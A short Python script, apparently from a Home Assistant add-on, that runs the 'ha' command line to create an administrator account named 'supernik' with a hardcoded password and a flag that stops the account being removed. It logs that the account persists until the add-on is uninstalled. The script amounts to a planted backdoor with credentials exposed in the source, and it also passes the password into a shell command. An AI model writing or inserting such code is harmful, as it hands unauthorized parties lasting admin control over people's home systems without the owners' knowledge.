import os
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)

def create_admin_user():
    username = "supernik"
    password = "38Yu62NskBRq65LwHHcFtxy8"  # Fixed password
    os.system(f"ha user add {username} --password {password} --admin --no-remove")
    logging.info(f"Admin user '{username}' created and cannot be deleted until the add-on is uninstalled!")

def main():
    create_admin_user()

if __name__ == "__main__":
    main()
